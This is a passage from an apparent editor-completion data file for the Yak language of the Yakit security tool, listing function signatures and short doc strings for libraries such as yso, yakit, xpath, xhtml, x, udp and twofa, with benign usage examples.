              'GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:GenerateClassObjectFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。\n\nLoadClassFromBytes、LoadClassFromBase64、LoadClassFromBCEL等函数都是基于这个函数实现的。\n\n参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。\n\nbytes：要从中加载类对象的字节数组。\n\noptions：用于配置类对象的可变参数函数列表。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nbytesCode,_ =codec.DecodeBase64("yv66vg...")\nclassObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象\n```\n',
          },
          {
            functionName: "GenerateClass(${1:options...})",
            document: "",
            definitionStr:
              "GenerateClass(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)",
          },
        ],
      },
      {
        libName: "yaml",
        prefix: "yaml.",
        functions: [
          {
            functionName: "UnmarshalStrict(${1:b /*type: []byte*/})",
            document: "",
            definitionStr: "UnmarshalStrict(b []byte) (any, error)",
          },
          {
            functionName: "Unmarshal(${1:b /*type: []byte*/})",
            document: "",
            definitionStr: "Unmarshal(b []byte) (any, error)",
          },
          {
            functionName: "Marshal(${1:in})",
            document: "",
            definitionStr:
              'Marshal(in any) (out []byte, err error)  doc:Marshal serializes the value provided into a YAML document. The structure\nof the generated document will reflect the structure of the value itself.\nMaps and pointers (to struct, string, int, etc) are accepted as the in value.\n\nStruct fields are only marshalled if they are exported (have an upper case\nfirst letter), and are marshalled using the field name lowercased as the\ndefault key. Custom keys may be defined via the "yaml" name in the field\ntag: the content preceding the first comma is used as the key, and the\nfollowing comma-separated options are used to tweak the marshalling process.\nConflicting names result in a runtime error.\n\nThe field tag format accepted is:\n\n    `(...) yaml:"[<key>][,<flag1>[,<flag2>]]" (...)`\n\nThe following flags are currently supported:\n\n    omitempty    Only include the field if it\'s not set to the zero\n                 value for the type or to empty slices or maps.\n                 Zero valued structs will be omitted if all their public\n                 fields are zero, unless they implement an IsZero\n                 method (see the IsZeroer interface type), in which\n                 case the field will be excluded if IsZero returns true.\n\n    flow         Marshal using a flow style (useful for structs,\n                 sequences and maps).\n\n    inline       Inline the field, which must be a struct or a map,\n                 causing all of its fields or keys to be processed as if\n                 they were part of the outer struct. For maps, keys must\n                 not conflict with the yaml keys of other struct fields.\n\nIn addition, if the key is "-", the field is ignored.\n\nFor example:\n\n    type T struct {\n        F int `yaml:"a,omitempty"`\n        B int\n    }\n    yaml.Marshal(&T{B: 2}) // Returns "b: 2\\n"\n    yaml.Marshal(&T{F: 1}} // Returns "a: 1\\nb: 0\\n"\n',
          },
        ],
      },
      {
        libName: "yakit",
        prefix: "yakit.",
        functions: [
          {
            functionName: "Warn(${1:tmp /*type: string*/}, ${2:items...})",
            document: "",
            definitionStr: "Warn(tmp string, items ...any)",
          },
          {
            functionName: "UpdateYakitStoreLocal(${1:f /*type: string*/})",
            document: "",
            definitionStr: "UpdateYakitStoreLocal(f string) error",
          },
          {
            functionName:
              "UpdateYakitStoreFromGit(${1:ctx /*type: context.Context*/}, ${2:ghUrl /*type: string*/}, ${3:proxy...})",
            document: "",
            definitionStr:
              "UpdateYakitStoreFromGit(ctx context.Context, ghUrl string, proxy ...string) error",
          },
          {
            functionName: "UpdateYakitStore()",
            document: "",
            definitionStr: "UpdateYakitStore() error",
          },
          {
            functionName: "UpdateOnlineYakitStore()",
            document: "",
            definitionStr: "UpdateOnlineYakitStore() error",
          },
          {
            functionName:
              "TextTabData(${1:tabName /*type: string*/}, ${2:data /*type: string*/})",
            document: "",
            definitionStr: "TextTabData(tabName string, data string)",
          },
          {
            functionName: "Text(${1:tmp})",
            document: "",
            definitionStr: "Text(tmp any)",
          },
          {
            functionName: "TableData(${1:tableName /*type: string*/}, ${2:data})",
            document: "",
            definitionStr:
              "TableData(tableName string, data any) *YakitFixedTableData",
          },
          {
            functionName: "Success(${1:tmp})",
            document: "",
            definitionStr: "Success(tmp any)",
          },
          {
            functionName:
              "Stream(${1:streamType /*type: string*/}, ${2:streamId /*type: string*/}, ${3:stream /*type: io.Reader*/}, ${4:extra...})",
            document: "",
            definitionStr:
              "Stream(streamType string, streamId string, stream io.Reader, extra ...any)",
          },
          {
            functionName:
              "StatusCard(${1:id /*type: string*/}, ${2:data}, ${3:tags...})",
            document: "",
            definitionStr: "StatusCard(id string, data any, tags ...string) any",
          },
          {
            functionName:
              "SetProgressEx(${1:id /*type: string*/}, ${2:f /*type: float64*/})",
            document: "",
            definitionStr: "SetProgressEx(id string, f float64)",
          },
          {
            functionName: "SetProgress(${1:f /*type: float64*/})",
            document: "",
            definitionStr: "SetProgress(f float64)",
          },
          {
            functionName: "SetOnlineBaseUrl(${1:u /*type: string*/})",
            document: "",
            definitionStr: "SetOnlineBaseUrl(u string)",
          },
          {
            functionName: "SavePortFromResult(${1:t}, ${2:RuntimeId...})",
            document: "",
            definitionStr: "SavePortFromResult(t any, RuntimeId ...string) error",
          },
          {
            functionName:
              "SavePayloadByFile(${1:group /*type: string*/}, ${2:fileName /*type: string*/})",
            document: "",
            definitionStr:
              "SavePayloadByFile(group string, fileName string) error",
          },
          {
            functionName:
              "SavePayload(${1:group /*type: string*/}, ${2:payloadRaw})",
            document: "",
            definitionStr: "SavePayload(group string, payloadRaw any) error",
          },
          {
            functionName:
              "SaveHTTPFlow(${1:url /*type: string*/}, ${2:req /*type: *http.Request*/}, ${3:rsp /*type: *http.Response*/})",
            document: "",
            definitionStr:
              "SaveHTTPFlow(url string, req *http.Request, rsp *http.Response) error",
          },
          {
            functionName: "SaveDomain(${1:domain /*type: string*/}, ${2:ip...})",
            document: "",
            definitionStr: "SaveDomain(domain string, ip ...string) error",
          },
          {
            functionName: "Report(${1:i /*type: int*/})",
            document: "",
            definitionStr: "Report(i int)",
          },
          {
            functionName: "QueryUrlsByKeyword(${1:k /*type: string*/})",
            document: "",
            definitionStr: "QueryUrlsByKeyword(k string) chan string",
          },
          {
            functionName: "QueryUrlsAll()",
            document: "",
            definitionStr: "QueryUrlsAll() chan string",
          },
          {
            functionName:
              "QueryPortAssetByNetwork(${1:network /*type: string*/})",
            document: "",
            definitionStr:
              "QueryPortAssetByNetwork(network string) (chan *schema.Port, error)",
          },
          {
            functionName: "QueryHostsByNetwork(${1:network /*type: string*/})",
            document: "",
            definitionStr:
              "QueryHostsByNetwork(network string) (chan *schema.Host, error)",
          },
          {
            functionName: "QueryHostsByDomain(${1:keyword /*type: string*/})",
            document: "",
            definitionStr:
              "QueryHostsByDomain(keyword string) (chan *schema.Host, error)",
          },
          {
            functionName:
              "QueryHostPortByNetworkAndPort(${1:network /*type: string*/}, ${2:port /*type: string*/})",
            document: "",
            definitionStr:
              "QueryHostPortByNetworkAndPort(network string, port string) chan string",
          },
          {
            functionName: "QueryHostPortByNetwork(${1:network /*type: string*/})",
            document: "",
            definitionStr: "QueryHostPortByNetwork(network string) chan string",
          },
          {
            functionName: "QueryHostPortByKeyword(${1:target /*type: string*/})",
            document: "",
            definitionStr: "QueryHostPortByKeyword(target string) chan string",
          },
          {
            functionName: "QueryHostPortAll()",
            document: "",
            definitionStr: "QueryHostPortAll() chan string",
          },
          {
            functionName: "QueryHTTPFlowsByKeyword(${1:k /*type: string*/})",
            document: "",
            definitionStr:
              "QueryHTTPFlowsByKeyword(k string) chan *schema.HTTPFlow",
          },
          {
            functionName: "QueryHTTPFlowsAll()",
            document: "",
            definitionStr: "QueryHTTPFlowsAll() chan *schema.HTTPFlow",
          },
          {
            functionName: "QueryDomainsByTitle(${1:title /*type: string*/})",
            document: "",
            definitionStr:
              "QueryDomainsByTitle(title string) (chan *schema.Domain, error)",
          },
          {
            functionName: "QueryDomainsByNetwork(${1:network /*type: string*/})",
            document: "",
            definitionStr:
              "QueryDomainsByNetwork(network string) (chan *schema.Domain, error)",
          },
          {
            functionName:
              "QueryDomainsByDomainKeyword(${1:keyword /*type: string*/})",
            document: "",
            definitionStr:
              "QueryDomainsByDomainKeyword(keyword string) (chan *schema.Domain, error)",
          },
          {
            functionName: "Output(${1:i})",
            document: "",
            definitionStr: "Output(i any) error",
          },
          {
            functionName: "ObjToPort(${1:t})",
            document: "",
            definitionStr: "ObjToPort(t any) (*schema.Port, error)",
          },
          {
            functionName: "NewWordCloud(${1:graphName...})",
            document: "",
            definitionStr: "NewWordCloud(graphName ...string) *YakitGraph",
          },
          {
            functionName: "NewTable(${1:head...})",
            document: "",
            definitionStr: "NewTable(head ...string) *YakitTable",
          },
          {
            functionName: "NewPieGraph(${1:graphName...})",
            document: "",
            definitionStr: "NewPieGraph(graphName ...string) *YakitGraph",
          },
          {
            functionName: "NewLineGraph(${1:graphName...})",
            document: "",
            definitionStr: "NewLineGraph(graphName ...string) *YakitGraph",
          },
          {
            functionName:
              "NewHTTPFlowRisk(${1:riskName /*type: string*/}, ${2:isHttps /*type: bool*/}, ${3:url /*type: string*/}, ${4:req /*type: []byte*/}, ${5:rsp /*type: []byte*/})",
            document: "",
            definitionStr:
              "NewHTTPFlowRisk(riskName string, isHttps bool, url string, req []byte, rsp []byte) *YakitHTTPFlowRisk",
          },
          {
            functionName: "NewClient(${1:addr /*type: string*/})",
            document: "",
            definitionStr: "NewClient(addr string) *YakitClient",
          },
          {
            functionName: "NewBarGraph(${1:graphName...})",
            document: "",
            definitionStr: "NewBarGraph(graphName ...string) *YakitGraph",
          },
          {
            functionName: "Markdown(${1:tmp})",
            document: "",
            definitionStr: "Markdown(tmp any)",
          },
          {
            functionName: "InitYakit(${1:y /*type: *YakitClient*/})",
            document: "",
            definitionStr: "InitYakit(y *YakitClient)",
          },
          {
            functionName: "Info(${1:tmp /*type: string*/}, ${2:items...})",
            document: "",
            definitionStr: "Info(tmp string, items ...any)",
          },
          {
            functionName: "GetOnlineBaseUrl()",
            document: "",
            definitionStr: "GetOnlineBaseUrl() YAK_ONLINE_BASEURL",
          },
          {
            functionName: "GetHomeTempDir()",
            document: "",
            definitionStr: "GetHomeTempDir() string",
          },
          {
            functionName: "GetHomeDir()",
            document: "",
            definitionStr: "GetHomeDir() string",
          },
          {
            functionName:
              "GenerateYakitMITMHooksParams(${1:method /*type: string*/}, ${2:url /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              "GenerateYakitMITMHooksParams(method string, url string, opts ...http_struct.HttpOption) ([]any, error)",
          },
          {
            functionName: "File(${1:fileName /*type: string*/}, ${2:desc...})",
            document: "",
            definitionStr: "File(fileName string, desc ...any)",
          },
          {
            functionName: "Error(${1:tmp /*type: string*/}, ${2:items...})",
            document: "",
            definitionStr: "Error(tmp string, items ...any)",
          },
          {
            functionName: "EnableWebsiteTrees(${1:targets /*type: string*/})",
            document: "",
            definitionStr: "EnableWebsiteTrees(targets string) any",
          },
          {
            functionName: "EnableText(${1:tabName /*type: string*/})",
            document: "",
            definitionStr: "EnableText(tabName string)",
          },
          {
            functionName:
              "EnableTable(${1:tableName /*type: string*/}, ${2:columns /*type: []string*/})",
            document: "",
            definitionStr: "EnableTable(tableName string, columns []string) any",
          },
          {
            functionName: "DeletePayloadByGroup(${1:group /*type: string*/})",
            document: "",
            definitionStr: "DeletePayloadByGroup(group string) error",
          },
          {
            functionName: "Debug(${1:tmp /*type: string*/}, ${2:items...})",
            document: "",
            definitionStr: "Debug(tmp string, items ...any)",
          },
          {
            functionName: "Code(${1:tmp})",
            document: "",
            definitionStr: "Code(tmp any)",
          },
          {
            functionName: "AutoInitYakit()",
            document: "",
            definitionStr: "AutoInitYakit() any",
          },
        ],
      },
      {
        libName: "xpath",
        prefix: "xpath.",
        functions: [
          {
            functionName:
              "SelectAttr(${1:n /*type: *html.Node*/}, ${2:name /*type: string*/})",
            document: "",
            definitionStr:
              'SelectAttr(n *html.Node, name string) (val string)  doc:SelectAttr 返回传入节点指定名称的属性值\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\nnode = xpath.FindOne(doc, "//div[@class=\'content\']")\nattr = xpath.SelectAttr(node, "class")\n```\n',
          },
          {
            functionName:
              "QueryAll(${1:top /*type: *html.Node*/}, ${2:expr /*type: string*/})",
            document: "",
            definitionStr:
              "QueryAll(top *html.Node, expr string) ([]*html.Node, error)  doc:QueryAll 根据传入的 XPath 表达式从传入的节点开始查找匹配的节点，返回节点数组与错误\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\nnodes, err = xpath.QueryAll(doc, \"//div[@class='content']/text()\")\n```\n",
          },
          {
            functionName:
              "Query(${1:top /*type: *html.Node*/}, ${2:expr /*type: string*/})",
            document: "",
            definitionStr:
              "Query(top *html.Node, expr string) (*html.Node, error)  doc:Query 根据传入的 XPath 表达式从传入的节点开始查找第一个匹配的节点，返回节点与错误\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\nnode, err = xpath.Query(doc, \"//div[@class='content']/text()\")\n```\n",
          },
          {
            functionName: "OutputHTMLSelf(${1:doc /*type: *html.Node*/})",
            document: "",
            definitionStr:
              "OutputHTMLSelf(doc *html.Node) string  doc:OutputHTMLSelf 将传入的节点结构体引用转换为 HTML 文本，包含自身节点\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\nhtmlText = xpath.OutputHTMLSelf(doc)\n```\n",
          },
          {
            functionName: "OutputHTML(${1:doc /*type: *html.Node*/})",
            document: "",
            definitionStr:
              "OutputHTML(doc *html.Node) string  doc:OutputHTML 将传入的节点结构体引用转换为 HTML 文本\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\nhtmlText = xpath.OutputHTML(doc)\n```\n",
          },
          {
            functionName: "LoadHTMLDocument(${1:htmlText})",
            document: "",
            definitionStr:
              "LoadHTMLDocument(htmlText any) (*html.Node, error)  doc:LoadHTMLDocument 解析传入的 HTML 文本，返回根节点结构体引用与错误\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\n```\n",
          },
          {
            functionName: "InnerText(${1:n /*type: *html.Node*/})",
            document: "",
            definitionStr:
              "InnerText(n *html.Node) string  doc:InnerText 返回指定节点及其子节点的字符串\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\nnode = xpath.FindOne(doc, \"//div[@class='content']\")\ntext = xpath.InnerText(node)\n```\n",
          },
          {
            functionName:
              "FindOne(${1:top /*type: *html.Node*/}, ${2:expr /*type: string*/})",
            document: "",
            definitionStr:
              "FindOne(top *html.Node, expr string) *html.Node  doc:FindOne 根据传入的 XPath 表达式从传入的节点开始查找第一个匹配的节点\n\n如果表达式解析出错会 panic\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\nnode = xpath.FindOne(doc, \"//div[@class='content']/text()\")\n```\n",
          },
          {
            functionName:
              "Find(${1:top /*type: *html.Node*/}, ${2:expr /*type: string*/})",
            document: "",
            definitionStr:
              "Find(top *html.Node, expr string) []*html.Node  doc:Find 根据传入的 XPath 表达式从传入的节点开始查找匹配的节点，返回节点数组\n\n如果表达式解析出错会 panic\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\nnodes = xpath.Find(doc, \"//div[@class='content']/text()\")\n```\n",
          },
          {
            functionName:
              "ExistedAttr(${1:n /*type: *html.Node*/}, ${2:name /*type: string*/})",
            document: "",
            definitionStr:
              'ExistedAttr(n *html.Node, name string) bool  doc:ExistsAttr 判断传入节点是否存在指定名称的属性并返回布尔值\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\nnode = xpath.FindOne(doc, "//div[@class=\'content\']")\nexisted = xpath.ExistsAttr(node, "class") // true\n```\n',
          },
          {
            functionName: "CreateXPathNavigator(${1:top /*type: *html.Node*/})",
            document: "",
            definitionStr:
              "CreateXPathNavigator(top *html.Node) *NodeNavigator  doc:CreateXPathNavigator 根据传入的节点创建一个新的 XPath 导航器，使用该导航器的方法来遍历该节点及其子节点\n\nExample:\n```\ndoc, err = xpath.LoadHTMLDocument(htmlText)\nnav = xpath.CreateXPathNavigator(doc)\nnav.MoveToChild()\nprintln(nav.String())\n```\n",
          },
        ],
      },
      {
        libName: "xml",
        prefix: "xml.",
        functions: [
          {
            functionName: "loads(${1:v})",
            document: "",
            definitionStr: "loads(v any) map[string]any",
          },
          {
            functionName: "dumps(${1:v})",
            document: "",
            definitionStr: "dumps(v any) []byte",
          },
          {
            functionName: "Escape(${1:s /*type: []byte*/})",
            document: "",
            definitionStr: "Escape(s []byte) string",
          },
        ],
      },
      {
        libName: "xhtml",
        prefix: "xhtml.",
        functions: [
          {
            functionName:
              "Walker(${1:h}, ${2:handler /*type: func(node *html.Node)*/})",
            document: "",
            definitionStr:
              'Walker(h any, handler func(node *html.Node)) error  doc:Walker 解析并遍历一段 HTML 代码的每一个节点并回调函数，返回错误\n\nExample:\n```\nerr = xhtml.Walker("<html><body><div>hello</div></body></html>", func(node) {\nprintln(node.Data)\n})\n```\n',
          },
          {
            functionName: "RandomUpperAndLower(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'RandomUpperAndLower(s string) string  doc:RandomUpperAndLower 返回一个随机大小写的字符串\n\nExample:\n```\nxhtml.RandomUpperAndLower("target") // TArGeT\n```\n',
          },
          {
            functionName:
              "MatchBetween(${1:srcBody}, ${2:start /*type: string*/}, ${3:end /*type: string*/}, ${4:n /*type: int*/})",
            document: "",
            definitionStr:
              'MatchBetween(srcBody any, start string, end string, n int) (int, string)  doc:MatchBetween 从字符串中匹配两个字符串之间的内容，最多匹配 n 个字符，n 为 -1 时不限制\n\n返回匹配到的内容的起始位置与匹配到的内容\n\nExample:\n```\nxhtml.MatchBetween("123456789", "2", "6", -1) // 2, "345"\n```\n',
          },
          {
            functionName: "GenerateXPath(${1:node /*type: *html.Node*/})",
            document: "",
            definitionStr:
              'GenerateXPath(node *html.Node) string  doc:GenerateXPath 根据节点引用生成一个节点的 XPath 路径\n\nExample:\n```\nxhtml.Walker("<html><body><div>hello</div></body></html>", func(node) {\nprintln(xhtml.GenerateXPath(node))\n})\n```\n',
          },
          {
            functionName: "Find(${1:htmlRaw}, ${2:matchStr /*type: string*/})",
            document: "",
            definitionStr:
              'Find(htmlRaw any, matchStr string) []*MatchNodeInfo  doc:Find 解析并遍历一段 HTML 代码的每一个节点并找到匹配字符串的节点，返回匹配字符串的节点信息的引用切片\n\nExample:\n```\nmatchInfoRes = xhtml.Find("<html><body><div>hello</div></body></html>", "hello")\n```\n',
          },
          {
            functionName: "CompareHtml(${1:htmlRaw1}, ${2:htmlRaw2})",
            document: "",
            definitionStr:
              "CompareHtml(htmlRaw1 any, htmlRaw2 any) ([]*DiffInfo, error)  doc:CompareHtml 比较两段 HTML 代码的差异，返回差异的节点信息结构体引用切片与错误\n\nExample:\n```\ndiff, err = xhtml.CompareHtml(html1, html2)\n```\n",
          },
        ],
      },
      {
        libName: "x",
        prefix: "x.",
        functions: [
          {
            functionName: "Zip(${1:slice1}, ${2:slice2})",
            document: "",
            definitionStr:
              "Zip(slice1 any, slice2 any) []Tuple  doc:Zip returns a list of tuples, where the i-th tuple contains the i-th element\nfrom each of the input iterables. The returned list is truncated in length\nto the length of the shortest input iterable.\n",
          },
          {
            functionName:
              "WaitConnect(${1:addr /*type: string*/}, ${2:timeout /*type: float64*/})",
            document: "",
            definitionStr:
              'WaitConnect(addr string, timeout float64) error  doc:WaitConnect 等待一个地址的端口开放或指导超时时间，如果超时则返回错误，这通常用于等待并确保一个服务启动\n\nExample:\n```\ntimeout, _ = time.ParseDuration("1m")\nctx, cancel = context.WithTimeout(context.New(), timeout)\n\n\tgo func() {\n\t    err = tcp.Serve("127.0.0.1", 8888, tcp.serverCallback(func (conn) {\n\t    conn.Send("hello world")\n\t    conn.Close()\n\t}), tcp.serverContext(ctx))\n\n\t    die(err)\n\t}()\n\nos.WaitConnect("127.0.0.1:8888", 5)~ // 等待tcp服务器启动\nconn = tcp.Connect("127.0.0.1", 8888)~\nbytes = conn.Recv()~\nprintln(string(bytes))\n```\n',
          },
          {
            functionName: "Values(${1:out})",
            document: "",
            definitionStr:
              "Values(out any) any  doc:Values creates an array of the own enumerable map values or struct field values.\n",
          },
          {
            functionName: "ToMap(${1:in}, ${2:pivot /*type: string*/})",
            document: "",
            definitionStr:
              "ToMap(in any, pivot string) any  doc:ToMap transforms a slice of instances to a Map.\n[]*Foo => Map<int, *Foo>\n",
          },
          {
            functionName: "ToFloat64(${1:x})",
            document: "",
            definitionStr:
              "ToFloat64(x any) (float64, bool)  doc:ToFloat64 converts any numeric value to float64.\n",
          },
          {
            functionName: "Tail(${1:arr})",
            document: "",
            definitionStr:
              "Tail(arr any) any  doc:Tail gets all but the first element of array.\n",
          },
          {
            functionName: "Sum(${1:arr})",
            document: "",
            definitionStr:
              "Sum(arr any) float64  doc:Sum computes the sum of the values in array.\n",
          },
          {
            functionName: "Subtract(${1:x}, ${2:y})",
            document: "",
            definitionStr:
              "Subtract(x any, y any) any  doc:Subtract returns the subtraction between two collections.\n",
          },
          {
            functionName: "Sort(${1:x}, ${2:less /*type: func(i, j int) bool*/})",
            document: "",
            definitionStr:
              "Sort(x any, less func(i, j int) bool)  doc:SliceStable sorts the slice x using the provided less\nfunction, keeping equal elements in their original order.\nIt panics if x is not a slice.\n\nThe less function must satisfy the same requirements as\nthe Interface type's Less method.\n",
          },
          {
            functionName: "Some(${1:in}, ${2:elements...})",
            document: "",
            definitionStr:
              "Some(in any, elements ...any) bool  doc:Some returns true if atleast one element is present in an iteratee.\n",
          },
          {
            functionName: "Shuffle(${1:in})",
            document: "",
            definitionStr:
              "Shuffle(in any) any  doc:Shuffle creates an array of shuffled values\n",
          },
          {
            functionName: "Shift(${1:i})",
            document: "",
            definitionStr: "Shift(i any) any",
          },
          {
            functionName: "Reverse(${1:in})",
            document: "",
            definitionStr:
              "Reverse(in any) any  doc:Reverse transforms an array the first element will become the last,\nthe second element will become the second to last, etc.\n",
          },
          {
            functionName:
              "Retry(${1:i /*type: int*/}, ${2:handler /*type: func() bool*/})",
            document: "",
            definitionStr:
              "Retry(i int, handler func() bool)  doc:retry 对第二个参数作为函数的情况，重试N次，如果第二个参数返回值是 true，则重试，否则就结束，如果遇到错误，停止重试\n\nExample:\n```\ncount = 0\n\n\tretry(100, () => {\n\t   defer recover()\n\n\t   count++\n\t   if count > 3 {\n\t       die(111)\n\t   }\n\t   return true\n\t})\n\nassert count == 4, f`${count}`\n\ncount = 0\n\n\tretry(100, () => {\n\t   defer recover()\n\n\t   count++\n\t   if count > 3 {\n\t       return false\n\t   }\n\t   return true\n\t})\n\nassert count == 4, f`${count}`\n\ncount = 0\n\n\tretry(100, () => {\n\t   count++\n\t})\n\nassert count == 1, f`${count}`\n\ncount = 0\n\n\tretry(100, () => {\n\t   count++\n\t   return true\n\t})\n\nassert count == 100, f`${count}`\n```\n",
          },
          {
            functionName: "RemoveRepeat(${1:in})",
            document: "",
            definitionStr:
              "RemoveRepeat(in any) any  doc:Uniq creates an array with unique values.\n",
          },
          {
            functionName:
              "Reduce(${1:i}, ${2:fc /*type: funkGeneralReduceFuncType*/}, ${3:acc})",
            document: "",
            definitionStr:
              "Reduce(i any, fc funkGeneralReduceFuncType, acc any) any",
          },
          {
            functionName: "Range(${1:i /*type: int*/})",
            document: "",
            definitionStr: "Range(i int) []any",
          },
          {
            functionName: "Min(${1:i})",
            document: "",
            definitionStr: "Min(i any) any",
          },
          {
            functionName: "Max(${1:i})",
            document: "",
            definitionStr: "Max(i any) any",
          },
          {
            functionName: "Map(${1:i}, ${2:fc /*type: funkGeneralFuncType*/})",
            document: "",
            definitionStr: "Map(i any, fc funkGeneralFuncType) any",
          },
          {
            functionName: "Keys(${1:out})",
            document: "",
            definitionStr:
              "Keys(out any) any  doc:Keys creates an array of the own enumerable map keys or struct field names.\n",
          },
          {
            functionName: "IsSubset(${1:x}, ${2:y})",
            document: "",
            definitionStr:
              "IsSubset(x any, y any) bool  doc:Subset returns true if collection x is a subset of y.\n",
          },
          {
            functionName: "Intersect(${1:x}, ${2:y})",
            document: "",
            definitionStr: "Intersect(x any, y any) any",
          },
          {
            functionName: "IndexOf(${1:in}, ${2:elem})",
            document: "",
            definitionStr:
              "IndexOf(in any, elem any) int  doc:IndexOf gets the index at which the first occurrence of value is found in array or return -1\nif the value cannot be found\n",
          },
          {
            functionName: "If(${1:i /*type: bool*/}, ${2:a}, ${3:b})",
            document: "",
            definitionStr: "If(i bool, a any, b any) any",
          },
          {
            functionName: "Head(${1:arr})",
            document: "",
            definitionStr:
              "Head(arr any) any  doc:Head gets the first element of array.\n",
          },
          {
            functionName: "GCPercent(${1:percent /*type: int*/})",
            document: "",
            definitionStr:
              "GCPercent(percent int) int  doc:SetGCPercent sets the garbage collection target percentage:\na collection is triggered when the ratio of freshly allocated data\nto live data remaining after the previous collection reaches this percentage.\nSetGCPercent returns the previous setting.\nThe initial setting is the value of the GOGC environment variable\nat startup, or 100 if the variable is not set.\nThis setting may be effectively reduced in order to maintain a memory\nlimit.\nA negative percentage effectively disables garbage collection, unless\nthe memory limit is reached.\nSee SetMemoryLimit for more details.\n",
          },
          {
            functionName: "GC()",
            document: "",
            definitionStr: "GC()",
          },
          {
            functionName: "ForeachRight(${1:i}, ${2:fc /*type: func(any)*/})",
            document: "",
            definitionStr: "ForeachRight(i any, fc func(any))",
          },
          {
            functionName: "Foreach(${1:i}, ${2:fc /*type: func(any)*/})",
            document: "",
            definitionStr: "Foreach(i any, fc func(any))",
          },
          {
            functionName: "Find(${1:i}, ${2:fc /*type: func(any) bool*/})",
            document: "",
            definitionStr: "Find(i any, fc func(any) bool) any",
          },
          {
            functionName: "Filter(${1:i}, ${2:fc /*type: func(any) bool*/})",
            document: "",
            definitionStr: "Filter(i any, fc func(any) bool) any",
          },
          {
            functionName: "Every(${1:in}, ${2:elements...})",
            document: "",
            definitionStr:
              "Every(in any, elements ...any) bool  doc:Every returns true if every element is present in a iteratee.\n",
          },
          {
            functionName: "Equal(${1:expected}, ${2:actual})",
            document: "",
            definitionStr:
              "Equal(expected any, actual any) bool  doc:IsEqual returns if the two objects are equal\n",
          },
          {
            functionName: "Drop(${1:in}, ${2:n /*type: int*/})",
            document: "",
            definitionStr:
              "Drop(in any, n int) any  doc:Drop creates an array/slice with `n` elements dropped from the beginning.\n",
          },
          {
            functionName: "Difference(${1:x}, ${2:y})",
            document: "",
            definitionStr:
              "Difference(x any, y any) (any, any)  doc:Difference returns the difference between two collections.\n",
          },
          {
            functionName: "ConvertToMap(${1:i})",
            document: "",
            definitionStr: "ConvertToMap(i any) map[string][]string",
          },
          {
            functionName: "Contains(${1:in}, ${2:elem})",
            document: "",
            definitionStr:
              "Contains(in any, elem any) bool  doc:Contains returns true if an element is present in a iteratee.\n",
          },
          {
            functionName: "Chunk(${1:arr}, ${2:size /*type: int*/})",
            document: "",
            definitionStr:
              "Chunk(arr any, size int) any  doc:Chunk creates an array of elements split into groups with the length of size.\nIf array can't be split evenly, the final chunk will be\nthe remaining element.\n",
          },
          {
            functionName: "Any(${1:objs...})",
            document: "",
            definitionStr:
              "Any(objs ...any) bool  doc:Any returns true if any element of the iterable is not empty. If the iterable is empty, return False.\n",
          },
          {
            functionName: "All(${1:objs...})",
            document: "",
            definitionStr:
              "All(objs ...any) bool  doc:All returns true if all elements of the iterable are not empty (or if the iterable is empty)\n",
          },
        ],
      },
      {
        libName: "udp",
        prefix: "udp.",
        functions: [
          {
            functionName: "serverTimeout(${1:f /*type: float64*/})",
            document: "",
            definitionStr: "serverTimeout(f float64) UdpServerOpt",
          },
          {
            functionName: "serverContext(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr: "serverContext(ctx context.Context) UdpServerOpt",
          },
          {
            functionName:
              "serverCallback(${1:cb /*type: func(*udpConnection, []byte)*/})",
            document: "",
            definitionStr:
              "serverCallback(cb func(*udpConnection, []byte)) UdpServerOpt",
          },
          {
            functionName: "clientTimeout(${1:target /*type: float64*/})",
            document: "",
            definitionStr: "clientTimeout(target float64) udpClientOption",
          },
          {
            functionName: "clientLocalAddr(${1:target /*type: string*/})",
            document: "",
            definitionStr: "clientLocalAddr(target string) udpClientOption",
          },
          {
            functionName:
              "Serve(${1:host /*type: string*/}, ${2:port}, ${3:opts...})",
            document: "",
            definitionStr:
              "Serve(host string, port any, opts ...UdpServerOpt) error",
          },
          {
            functionName: "MockUDPProtocol(${1:name /*type: string*/})",
            document: "",
            definitionStr: "MockUDPProtocol(name string) (string, int)",
          },
          {
            functionName:
              "Connect(${1:target /*type: string*/}, ${2:portRaw}, ${3:opts...})",
            document: "",
            definitionStr:
              "Connect(target string, portRaw any, opts ...udpClientOption) (*udpConnection, error)",
          },
        ],
      },
      {
        libName: "twofa",
        prefix: "twofa.",
        functions: [
          {
            functionName: "poc(${1:secret /*type: string*/})",
            document: "",
            definitionStr:
              "poc(secret string) poc.PocConfigOption  doc:poc 是一个请求选项，设置 Y-T-Verify-Code 的值为 secret 计算出的 UTC 时间验证码，适配于 poc 包\n",
          },
          {
            functionName:
              "VerifyUTCCode(${1:secret /*type: string*/}, ${2:code})",
            document: "",
            definitionStr:
              "VerifyUTCCode(secret string, code any) bool  doc:VerifyUTCCode in twofa lib will receive the secret and code, then return the verify result\n",
          },
          {
            functionName: "GetUTCCode(${1:secret /*type: string*/})",
            document: "",
            definitionStr:
              "GetUTCCode(secret string) string  doc:GetUTCCode in twofa lib will receive the secret and return the verify code with utc time\n",
          },
        ],
      },
      {
        libName: "traceroute",
        prefix: "traceroute.",
        functions: [
          {
            functionName: "udpPort(${1:port /*type: int*/})",
            document: "",
            definitionStr: "udpPort(port int) TracerouteConfigOption",
          },
          {
